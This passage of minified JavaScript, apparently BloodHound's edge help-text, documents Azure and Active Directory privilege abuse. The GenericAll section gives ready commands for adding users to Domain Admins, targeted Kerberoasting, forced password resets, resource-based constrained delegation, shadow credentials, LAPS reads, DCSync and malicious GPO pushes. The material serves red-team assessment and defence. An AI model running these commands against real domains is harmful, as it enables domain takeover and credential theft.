{}'}),h(A,{variant:"body2",children:'As you can see, the plain-text value of the user’s password is visible in the "Content" parameter value.'})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"When resetting a user’s password and letting Azure set a new random password, Azure will log two events:"}),h(A,{variant:"body2",children:"“Reset user password” and “Reset password (by admin)”. These logs describe who performed the password reset, against which user, and at what time."}),h(A,{variant:"body2",children:"When setting a specified new password for the user, Azure will log two events:"}),h(A,{variant:"body2",children:"“Reset user password” and “Update user”. The first log will describe who changed the target’s password and when."})]}),references:()=>h(A,{variant:"body2",children:h(S,{target:"_blank",rel:"noopener",href:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword",children:"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#set-azureuserpassword"})})},xr={general:()=>h(A,{variant:"body2",children:"The Azure App runs as the Service Principal when it needs to authenticate to the tenant"}),abuse:()=>h(A,{variant:"body2",children:"This edge should be taken into consideration when abusing control of an app. Apps authenticate with service principals to the tenant, so if you have control of an app, what you are abusing is that control plus the fact that the app runs as a privileged service principal"}),opsec:()=>h(A,{variant:"body2",children:"No opsec considerations for this edge."}),references:()=>h(v,{sx:{overflowX:"auto"},children:h(S,{target:"_blank",rel:"noopener",href:"https://www.google.com",children:"References go here"})})},Gr={general:()=>h(A,{variant:"body2",children:"The User Access Admin role can edit roles against many other objects"}),abuse:()=>h(A,{variant:"body2",children:"This role can be used to grant yourself or another principal any privilege you want against Automation Accounts, VMs, Key Vaults, and Resource Groups. Use the Azure portal to add a new, abusable role assignment against the target object for yourself."}),opsec:()=>h(A,{variant:"body2",children:"Azure will log any role activation event for any object type."}),references:()=>h(v,{sx:{overflowX:"auto"},children:h(S,{target:"_blank",rel:"noopener",href:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/",children:"https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/"})})},jr={general:()=>p(u,{children:[h(A,{variant:"body2",children:'When a virtual machine is configured to allow logon with Azure AD credentials, the VM automatically has certain principals added to its local administrators group, including any principal granted the Virtual Machine Administrator Login (or "VMAL") admin role.'}),h(A,{variant:"body2",children:"Any principal granted this role, scoped to the affected VM, can connect to the VM via RDP and will be granted local admin rights on the VM."})]}),abuse:()=>h(u,{children:h(A,{variant:"body2",children:"Connect to the VM via RDP and you will be granted local admin rights on the VM."})}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"If the target computer is a workstation and a user is currently logged on, one of two things will happen. If the user you are abusing is the same user as the one logged on, you will effectively take over their session and kick the logged on user off, resulting in a message to the user. If the users are different, you will be prompted to kick the currently logged on user off the system and log on. If the target computer is a server, you will be able to initiate the connection without issue provided the user you are abusing is not currently logged in."}),h(A,{variant:"body2",children:"Remote desktop will create Logon and Logoff events with the access type RemoteInteractive."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/tactics/TA0008/",children:"ATT&CK T0008: Lateral Movement"}),h(S,{target:"_blank",rel:"noopener",href:"https://attack.mitre.org/techniques/T1021/",children:"ATT&CK T1021: Remote Services"}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/azure/active-directory/devices/howto-vm-sign-in-azure-ad-windows",children:"Login to Windows virtual machine in Azure using Azure Active Directory authentication"})]})},Er={GenericAll:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," GenericAll privileges to the ",Cr(n)," ",r,"."]}),h(A,{variant:"body2",children:"This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish."})]}),windowsAbuse:({sourceName:e,sourceType:t,targetName:r,targetType:n,targetId:o,haslaps:a})=>{switch(n){case"Group":return p(u,{children:[h(A,{variant:"body2",children:"Full control of a group allows you to directly modify group membership of the group."}),h(A,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),h(A,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]});case"User":return p(u,{children:[h(A,{variant:"body2",children:"Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one."}),h(A,{variant:"body1",children:" Targeted Kerberoast "}),h(A,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),h(A,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),h(A,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"}),h(A,{variant:"body1",children:" Force Change Password "}),h(A,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),h(A,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),p(A,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]});case"Computer":return p(u,a?{children:[h(A,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),h(A,{variant:"body2",children:"Alternatively, Full control of a computer object can be used to perform a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}:{children:[h(A,{variant:"body2",children:"Full control of a computer object can be used to perform a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});case"Domain":return p(u,{children:[h(A,{variant:"body2",children:"Full control of a domain object grants you both DS-Replication-Get-Changes as well as DS-Replication-Get-Changes-All rights. The combination of these rights allows you to perform the dcsync attack using mimikatz. To grab the credential of the user harmj0y using these rights:"}),h(A,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:harmj0y"})]});case"GPO":return h(u,{children:h(A,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."})});case"OU":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Organization Unit"}),h(A,{variant:"body2",children:"With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),p(A,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",r," is: ",o,"."]}),h(A,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),h(A,{component:"pre",children:"$Guids = Get-DomainGUIDMap\n$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name"}),h(A,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),h(A,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),h(A,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),h(A,{component:"pre",children:"$OU = Get-DomainOU -Raw (OU GUID)\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:'If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView\'s help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:'}),h(A,{component:"pre",children:"$Guids = Get-DomainGUIDMap\n$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n$OU = Get-DomainOU -Raw Workstations\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()"})]});default:return h(u,{})}},linuxAbuse:({sourceName:e,sourceType:t,targetName:r,targetType:n,targetId:o,haslaps:a})=>{switch(n){case"Group":return p(u,{children:[h(A,{variant:"body2",children:"Full control of a group allows you to directly modify group membership of the group."}),h(A,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),h(A,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replaced with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),h(A,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]});case"User":return p(u,{children:[h(A,{variant:"body2",children:"Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one."}),h(A,{variant:"body1",children:" Targeted Kerberoast "}),p(A,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),h(A,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),h(A,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),h(A,{variant:"body1",children:" Force Change Password "}),h(A,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),h(A,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return p(u,a?{children:[h(A,{variant:"body1",children:" Retrieve LAPS Password "}),h(A,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:",h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:",h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.',h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.",h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}:{children:[h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:",h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:",h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.',h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.",h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return p(u,{children:[h(A,{variant:"body1",children:" DCSync "}),p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",r,"."]}),h(A,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),h(A,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),h(A,{variant:"body1",children:" Retrieve LAPS Passwords "}),p(A,{variant:"body2",children:["The AllExtendedRights privilege also grants ",e," enough privileges, to retrieve LAPS passwords domain-wise."]}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});case"GPO":return p(u,{children:[h(A,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Organization Unit"}),h(A,{variant:"body2",children:"With full control of the OU, you may add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:'The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket\'s dacledit (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"Container":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Container"}),h(A,{variant:"body2",children:"With full control of the container, you may add a new ACE on the container that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:'The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket\'s dacledit (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]})}return h(u,{})},opsec:()=>h(A,{variant:"body2",children:"This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/",children:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e",children:"https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",children:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/group-policies",children:"https://www.thehacker.recipes/ad/movement/group-policies"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"